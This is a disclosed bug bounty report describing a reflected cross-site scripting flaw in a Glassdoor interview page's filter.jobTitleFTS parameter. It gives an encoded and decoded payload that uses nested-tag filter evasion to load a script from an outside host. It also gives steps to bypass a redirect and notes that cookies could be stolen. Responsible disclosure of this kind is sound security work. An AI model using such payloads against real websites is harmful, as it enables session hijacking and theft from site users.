# Reflected XSS at https://www.glassdoor.com/Interview/Accenturme-Interview-Questions-E9931.htm  via  filter.jobTitleFTS  parameter

## Report Details
- **Report ID**: 995936
- **URL**: https://hackerone.com/reports/995936
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-10-01T14:37:42.120Z
- **Disclosed**: 2021-04-16T02:55:44.374Z

## Reporter
- **Username**: n1xk_10
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: glassdoor

## Vulnerability Information
The endpoint https://www.glassdoor.com/Interview/Accenturme-Interview-Questions-E9931.htm is vulnerable to reflected XSS.
Affected Parameter: filter.jobTitleFTS
Browsers tested: Chrome, Firefox

Payload: %3c%3c%3ca%3ea%3escript%20SrC%3d%22%68%74%74%70s%3a%2f%2f%73%6b%69%6e%6e%79%2d%66%65%61%72%2e%73%75%72%67%65%2e%73%68%2f%70%61%79%6c%6f%61%64%2e%6a%73%22%3e%3c%3c%3ca%3ea%3e%2fscript%3e

Decoded: <<<a>a>script SrC="https://skinny-fear.surge.sh/payload.js"><<<a>a>/script>


 Steps To Reproduce:

1. Navigate to https://www.glassdoor.com/Interview/Accenture-Interview-Questions-E4138.htm?filter.jobTitleFTS=Business%20Analyst
2. Add a parameter countryRedirect=True 
3. Because of this parameter the browser does not get redirected to another page when we enter payload.
4. Now enter the payload inside filter.jobTitleFTS parameter
5. See the response, an alert will pop up

## Impact

Using XSS an attacker can steals the victim cookie and can also redirect him to a malicious site controlled by the attacker.

## Attachments
- Screenshot_at_2020-10-01_20-01-08.png
